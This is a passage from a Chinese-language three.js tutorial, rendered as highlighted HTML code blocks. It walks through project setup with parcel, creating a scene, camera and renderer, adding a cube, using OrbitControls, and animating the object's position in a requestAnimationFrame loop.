<span class="string">&quot;parcel build src/index.html&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;parcel&quot;</span>: <span class="string">&quot;^2.4.1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;dat.gui&quot;</span>: <span class="string">&quot;^0.7.9&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;gsap&quot;</span>: <span class="string">&quot;^3.10.3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;three&quot;</span>: <span class="string">&quot;^0.139.2&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>安装依赖package.json设置的依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>现在您可以运行yarn build以构建您的生产项目并yarn dev启动开发服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn dev </span><br></pre></td></tr></table></figure><h2 id="三、Threejs渲染第一个场景和物体"><a href="#三、Threejs渲染第一个场景和物体" class="headerlink" title="三、Threejs渲染第一个场景和物体"></a>三、Threejs渲染第一个场景和物体</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念</h3><p>三维的物体要渲染在二维的屏幕上。首先要创建一个场景来放置物体，那么最终怎么显示三维的内容，就应该找一个相机，将相机放在场景的某个位置，然后想要显示就要把相机拍的内容渲染出来。所以就引出三个基本概念：场景、相机、渲染器。</p><h4 id="1-1-场景"><a href="#1-1-场景" class="headerlink" title="1.1 场景"></a>1.1 场景</h4><p>three.js创建场景非常的简单。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br></pre></td></tr></table></figure><h4 id="1-2-相机"><a href="#1-2-相机" class="headerlink" title="1.2 相机"></a>1.2 相机</h4><p>three.js创建相机对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>); </span><br></pre></td></tr></table></figure><p>three.js里有几种不同的相机，在这里，我们使用的是<strong>PerspectiveCamera</strong>（透视摄像机）。</p><p>第一个参数是<strong>视野角度（FOV</strong>）。视野角度就是无论在什么时候，你所能在显示器上看到的场景的范围，它的单位是角度(与弧度区分开)。</p><p>第二个参数是<strong>长宽比（aspect ratio</strong>）。 也就是你用一个物体的宽除以它的高的值。比如说，当你在一个宽屏电视上播放老电影时，可以看到图像仿佛是被压扁的。</p><p>接下来的两个参数是<strong>近截面</strong>（near）和远截面（far）。 当物体某些部分比摄像机的<strong>远截面</strong>远或者比<strong>近截面</strong>近的时候，该这些部分将不会被渲染到场景中。或许现在你不用担心这个值的影响，但未来为了获得更好的渲染性能，你将可以在你的应用程序里去设置它。</p><p>下图椎体就是上面设置视野角度、长宽比、近截面和远截面的演示的相机透视椎体。</p><p><img src="https://i0.hdslb.com/bfs/article/11c2c2d27b322c07ee20b70018cd0df551eaea2e.png@597w_402h_progressive.webp" alt="img"></p><h4 id="1-3-渲染器"><a href="#1-3-渲染器" class="headerlink" title="1.3 渲染器"></a>1.3 渲染器</h4><p>接下来是渲染器。这里是施展魔法的地方。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line">renderer.render(scene, camera);</span><br></pre></td></tr></table></figure><p>除了创建一个渲染器的实例之外，我们还需要在我们的应用程序里设置一个渲染器的尺寸。比如说，我们可以使用所需要的渲染区域的宽高，来让渲染器渲染出的场景填充满我们的应用程序。因此，我们可以将渲染器宽高设置为浏览器窗口宽高。对于性能比较敏感的应用程序来说，你可以使用<code>setSize</code>传入一个较小的值，例如<code>window.innerWidth/2</code>和<code>window.innerHeight/2</code>，这将使得应用程序在渲染时，以一半的长宽尺寸渲染场景。</p><p>接下来将<code>renderer</code>（渲染器）的dom元素（renderer.domElement）添加到我们的HTML文档中。渲染器用来显示场景给我们看的<canvas>元素。</p><p>最后就是对将相机对场景进行拍照渲染啦。这一句就可以将画面渲染到canvas上显示出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">renderer.render(scene, camera);</span><br></pre></td></tr></table></figure><h4 id="1-4-加入立方体"><a href="#1-4-加入立方体" class="headerlink" title="1.4 加入立方体"></a>1.4 加入立方体</h4><p>要创建一个立方体，我们需要一个<strong>BoxGeometry</strong>（立方体）对象. 这个对象包含了一个立方体中所有的顶点（<strong>vertices</strong>）和面（<strong>faces</strong>）。</p><p>接下来，对于这个立方体，我们需要给它一个材质，来让它有颜色。这里我们使用的是<strong>MeshBasicMaterial</strong>。所有的材质都存有应用于他们的属性的对象。为了简单起见，我们只设置一个color属性，值为<strong>0x00ff00</strong>，也就是绿色。这里和CSS或者Photoshop中使用十六进制(<strong>hex colors</strong>)颜色格式来设置颜色的方式一致。</p><p>第三步，我们需要一个<strong>Mesh</strong>（网格）。 网格包含一个几何体以及作用在此几何体上的材质，我们可以直接将网格对象放入到我们的场景中，并让它在场景中自由移动。</p><p>默认情况下，当我们调用**scene.add()<strong>的时候，物体将会被添加到</strong>(0,0,0)**坐标。但将使得摄像机和立方体彼此在一起。为了防止这种情况的发生，我们只需要将摄像机稍微向外移动一些即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br></pre></td></tr></table></figure><h3 id="2-综合上述代码"><a href="#2-综合上述代码" class="headerlink" title="2 综合上述代码"></a>2 综合上述代码</h3><p><strong>在前面创建的项目中的main.js文件写入代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">&quot;three&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(THREE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标：了解three.js最基本的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、创建场景</span></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line">renderer.render(scene, camera);</span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://i0.hdslb.com/bfs/article/0b50a12934a7e62acc12251115c3448d85ffa1a7.png@704w_416h_progressive.webp" alt="img"></p><h2 id="四、Threejs轨道控制器查看物体"><a href="#四、Threejs轨道控制器查看物体" class="headerlink" title="四、Threejs轨道控制器查看物体"></a>四、Threejs轨道控制器查看物体</h2><h3 id="1-如何360度的查看立方体"><a href="#1-如何360度的查看立方体" class="headerlink" title="1 如何360度的查看立方体"></a>1 如何360度的查看立方体</h3><p>使用控制控制器，让相机围绕立方体运动，就像地球围绕太阳一样运动，去观察立方体。</p><p><img src="https://i0.hdslb.com/bfs/article/46eb73b99d98da462440cad79aa34795a2294ef4.gif@489w_282h_progressive.webp" alt="img"></p><h4 id="1-1-创建轨道控制器"><a href="#1-1-创建轨道控制器" class="headerlink" title="1.1 创建轨道控制器"></a>1.1 创建轨道控制器</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建轨道控制器</span></span><br><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, renderer.domElement);</span><br></pre></td></tr></table></figure><p><strong>必须传入2个参数：</strong></p><ol><li><p>相机，让哪一个相机围绕目标运动。默认目标是原点。立方体在原点处。</p></li><li><p>渲染的画布dom对象，用于监听鼠标事件控制相机的围绕运动。</p></li></ol><h4 id="1-2-每一帧根据控制器更新画面"><a href="#1-2-每一帧根据控制器更新画面" class="headerlink" title="1.2 每一帧根据控制器更新画面"></a>1.2 每一帧根据控制器更新画面</h4><p>因为控制器监听鼠标事件之后，要根据鼠标的拖动，来控制相机围绕目标运动，并根据运动之后的效果，显示出画面来。为了保证画面流畅渲染，选择使用请求动画帧requestAnimationFrame，在屏幕渲染下一帧画面时触发回调函数来执行画面的渲染。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//如果后期需要控制器带有阻尼效果，或者自动旋转等效果，就需要加入controls.update()</span></span><br><span class="line">  controls.update()</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><h5 id="1-2-1-requestAnimationFrame"><a href="#1-2-1-requestAnimationFrame" class="headerlink" title="1.2.1 requestAnimationFrame"></a>1.2.1 requestAnimationFrame</h5><p>是HTML5的新特性，区别于<code>setTimeout</code>和<code>setInterval</code>。<code>requestAnimationFrame</code>比后两者精确，采用系统时间间隔，保持最佳绘制效率，不会因为间隔时间过短，造成过度绘制，增加开销；也不会因为间隔时间太长，使动画卡顿不流畅，让各种网页动画效果能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果。</p><p><code>requestAnimationFrame</code>是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了CPU开销。</p><p>因此屏幕每一帧都刷新一次画面，就需要执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><h3 id="2-综合上述代码-1"><a href="#2-综合上述代码-1" class="headerlink" title="2 综合上述代码"></a>2 综合上述代码</h3><p><strong>在前面创建的项目中的main.js文件写入代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">&quot;three&quot;</span>;</span><br><span class="line"><span class="comment">// 导入轨道控制器</span></span><br><span class="line"><span class="keyword">import</span> &#123; OrbitControls &#125; <span class="keyword">from</span> <span class="string">&quot;three/examples/jsm/controls/OrbitControls&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(THREE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标：使用控制器查看3d物体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、创建场景</span></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// // 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line"><span class="comment">// renderer.render(scene, camera);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建轨道控制器</span></span><br><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加坐标轴辅助器</span></span><br><span class="line"><span class="keyword">const</span> axesHelper = <span class="keyword">new</span> THREE.AxesHelper(<span class="number">5</span>);</span><br><span class="line">scene.add(axesHelper);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://i0.hdslb.com/bfs/article/46eb73b99d98da462440cad79aa34795a2294ef4.gif@489w_282h_progressive.webp" alt="img"></p><h2 id="五、Threejs控制物体移动"><a href="#五、Threejs控制物体移动" class="headerlink" title="五、Threejs控制物体移动"></a>五、Threejs控制物体移动</h2><h3 id="1-控制物体移动"><a href="#1-控制物体移动" class="headerlink" title="1. 控制物体移动"></a>1. 控制物体移动</h3><p><img src="https://i0.hdslb.com/bfs/article/a35394deeabd8745cb7306363341f4d7e71fe513.gif@489w_282h_progressive.webp" alt="img"></p><p>为了让物体移动起来。我们可以设置它的<code>position</code>属性进行位置的设置。</p><p>相机和立方体都是物体。每个物体都是1个对象。</p><p>在官方文档里，我们可以看到相机<code>camera</code>和物体<code>mesh</code>都继承<code>Object3D</code>类。所以<code>camera</code>、<code>mesh</code>都属于3d对象。从3d对象的官方文档里，我们可以找到<code>position</code>属性，并且该属性一个<code>vector3</code>对象。因此通过官方<code>vector3</code>类的文档，我们可以简单使用下面2种方式来修改<code>position</code>位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置该向量的x、y 和 z 分量。</span></span><br><span class="line">mesh.position.set(x,y,z);</span><br><span class="line"><span class="comment">//直接设置position的x,y,z属性</span></span><br><span class="line">mesh.position.x = x;</span><br><span class="line">mesh.position.y = y;</span><br><span class="line">mesh.position.z = z;</span><br></pre></td></tr></table></figure><p>官方文档：<a href="https://threejs.org/docs/index.html?q=vect#api/zh/math/Vector3">https://threejs.org/docs/index.html?q=vect#api/zh/math/Vector3</a></p><p><img src="https://i0.hdslb.com/bfs/article/daedc9f76ed4fc5800af96f60ff560843806e3ed.png@909w_251h_progressive.webp" alt="img"></p><p><img src="https://i0.hdslb.com/bfs/article/daedc9f76ed4fc5800af96f60ff560843806e3ed.png@909w_251h_progressive.webp" alt="img"></p><p><img src="https://i0.hdslb.com/bfs/article/b1d8877a6b77718e509e95c59ce4cf22cc7db0cc.png@798w_147h_progressive.webp" alt="img"></p><h4 id="1-1-每一帧修改一点位置形成动画"><a href="#1-1-每一帧修改一点位置形成动画" class="headerlink" title="1.1 每一帧修改一点位置形成动画"></a>1.1 每一帧修改一点位置形成动画</h4><p>例如，每一帧让立方体向右移动0.01，并且当位置大于5时，从0开始。那么可以这么设置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  cube.position.x += <span class="number">0.01</span>;</span><br><span class="line">  <span class="keyword">if</span> (cube.position.x &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    cube.position.x = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><h3 id="2-综合上述代码-2"><a href="#2-综合上述代码-2" class="headerlink" title="2 综合上述代码"></a>2 综合上述代码</h3><p><strong>在前面创建的项目中的main.js文件写入代码</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">&quot;three&quot;</span>;</span><br><span class="line"><span class="comment">// 导入轨道控制器</span></span><br><span class="line"><span class="keyword">import</span> &#123; OrbitControls &#125; <span class="keyword">from</span> <span class="string">&quot;three/examples/jsm/controls/OrbitControls&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(THREE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标：控制3d物体移动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、创建场景</span></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、创建相机</span></span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera(</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  <span class="number">0.1</span>,</span><br><span class="line">  <span class="number">1000</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置相机位置</span></span><br><span class="line">camera.position.set(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加物体</span></span><br><span class="line"><span class="comment">// 创建几何体</span></span><br><span class="line"><span class="keyword">const</span> cubeGeometry = <span class="keyword">new</span> THREE.BoxGeometry(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> cubeMaterial = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">color</span>: <span class="number">0xffff00</span> &#125;);</span><br><span class="line"><span class="comment">// 根据几何体和材质创建物体</span></span><br><span class="line"><span class="keyword">const</span> cube = <span class="keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改物体的位置</span></span><br><span class="line"><span class="comment">// cube.position.set(5, 0, 0);</span></span><br><span class="line">cube.position.x = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将几何体添加到场景中</span></span><br><span class="line">scene.add(cube);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(cube);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化渲染器</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line"><span class="comment">// 设置渲染的尺寸大小</span></span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">// console.log(renderer);</span></span><br><span class="line"><span class="comment">// 将webgl渲染的canvas内容添加到body</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// // 使用渲染器，通过相机将场景渲染进来</span></span><br><span class="line"><span class="comment">// renderer.render(scene, camera);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 